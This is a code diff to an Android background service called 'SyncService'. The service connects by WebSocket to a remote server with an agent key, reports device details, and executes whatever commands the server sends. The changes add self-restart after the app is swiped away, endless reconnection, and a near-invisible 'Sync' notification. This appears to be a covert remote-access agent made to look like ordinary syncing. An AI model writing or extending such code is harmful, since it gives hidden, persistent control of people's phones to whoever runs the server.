@@ -14,34 +14,59 @@ class SyncService : Service() {
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var ws: WebSocket? = null
     private var retry = 1000L
+    private var isConnecting = false
+    private var reconnectJob: Job? = null
+
     private val client = OkHttpClient.Builder()
-        .pingInterval(30, TimeUnit.SECONDS)
-        .connectTimeout(30, TimeUnit.SECONDS)
+        .pingInterval(20, TimeUnit.SECONDS)
+        .connectTimeout(60, TimeUnit.SECONDS)
         .readTimeout(0, TimeUnit.MILLISECONDS)
+        .writeTimeout(0, TimeUnit.MILLISECONDS)
+        .retryOnConnectionFailure(true)
         .build()
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
-        startFg()
+        startFg("جاري الاتصال...")
         connect()
     }
 
     override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
-        if (ws == null) connect()
+        if (ws == null && !isConnecting) connect()
         return START_STICKY
     }
 
-    private fun startFg() {
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        // إعادة تشغيل الخدمة إذا أُزيل التطبيق من المهام
+        val restartServiceIntent = Intent(applicationContext, SyncService::class.java)
+        restartServiceIntent.setPackage(packageName)
+        val restartServicePendingIntent = PendingIntent.getService(
+            this, 1, restartServiceIntent,
+            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+        )
+        val alarmService = getSystemService(ALARM_SERVICE) as AlarmManager
+        alarmService.set(
+            AlarmManager.ELAPSED_REALTIME,
+            android.os.SystemClock.elapsedRealtime() + 1000,
+            restartServicePendingIntent
+        )
+        super.onTaskRemoved(rootIntent)
+    }
+
+    private fun startFg(status: String = "متصل") {
         val ch = "sync_ch"
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val c = NotificationChannel(ch, "Sync", NotificationManager.IMPORTANCE_MIN)
+            c.setShowBadge(false)
+            c.enableLights(false)
+            c.enableVibration(false)
             getSystemService(NotificationManager::class.java).createNotificationChannel(c)
         }
         val n = NotificationCompat.Builder(this, ch)
             .setContentTitle("Sync")
-            .setContentText("")
+            .setContentText(status)
             .setSmallIcon(android.R.drawable.stat_sys_upload)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
@@ -54,27 +79,48 @@ class SyncService : Service() {
     }
 
     private fun connect() {
-        val req = Request.Builder()
-            .url(BuildConfig.SERVER_URL)
-            .addHeader("X-Agent-Key", BuildConfig.AGENT_SECRET)
-            .addHeader("model", "${Build.MANUFACTURER}${Build.MODEL}")
-            .addHeader("battery", DeviceInfo.getBattery(this))
-            .addHeader("version", "Android ${Build.VERSION.RELEASE}")
-            .addHeader("provider", DeviceInfo.getProvider(this))
-            .build()
+        if (isConnecting || ws != null) return
+        isConnecting = true
+
+        val req = try {
+            Request.Builder()
+                .url(BuildConfig.SERVER_URL)
+                .addHeader("X-Agent-Key", BuildConfig.AGENT_SECRET)
+                .addHeader("model", "${Build.MANUFACTURER} ${Build.MODEL}")
+                .addHeader("battery", DeviceInfo.getBattery(this))
+                .addHeader("version", "Android ${Build.VERSION.RELEASE}")
+                .addHeader("provider", DeviceInfo.getProvider(this))
+                .build()
+        } catch (e: Exception) {
+            isConnecting = false
+            scheduleReconnect()
+            return
+        }
 
         ws = client.newWebSocket(req, object : WebSocketListener() {
-            override fun onOpen(w: WebSocket, r: Response) { retry = 1000L }
+            override fun onOpen(w: WebSocket, r: Response) {
+                isConnecting = false
+                retry = 1000L
+                startFg("✅ متصل")
+            }
+
             override fun onMessage(w: WebSocket, t: String) {
                 try {
                     AdvancedHandler(this@SyncService, w).handle(t)
-                } catch (e: Exception) {}
+                } catch (e: Exception) {
+                    // تجاهل أخطاء الأوامر الفردية
+                }
             }
+
             override fun onFailure(w: WebSocket, e: Throwable, r: Response?) {
+                isConnecting = false
                 ws = null
+                startFg("⏳ جاري إعادة الاتصال...")
                 scheduleReconnect()
             }
+
             override fun onClosed(w: WebSocket, c: Int, r: String) {
+                isConnecting = false
                 ws = null
                 scheduleReconnect()
             }
@@ -82,7 +128,8 @@ class SyncService : Service() {
     }
 
     private fun scheduleReconnect() {
-        scope.launch {
+        reconnectJob?.cancel()
+        reconnectJob = scope.launch {
             delay(retry)
             retry = (retry * 2).coerceAtMost(60000L)
             connect()
@@ -90,15 +137,22 @@ class SyncService : Service() {
     }
 
     override fun onDestroy() {
-        ws?.close(1000, "Destroy")
+        try {
+            ws?.close(1000, "Destroy")
+        } catch (e: Exception) {}
+        reconnectJob?.cancel()
         scope.cancel()
         super.onDestroy()
     }
 
     companion object {
         fun start(c: Context) {
-            val i = Intent(c, SyncService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) c.startForegroundService(i) else c.startService(i)
+            try {
+                val i = Intent(c, SyncService::class.java)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                    c.startForegroundService(i)
+                else c.startService(i)
+            } catch (e: Exception) {}
         }
     }
 }
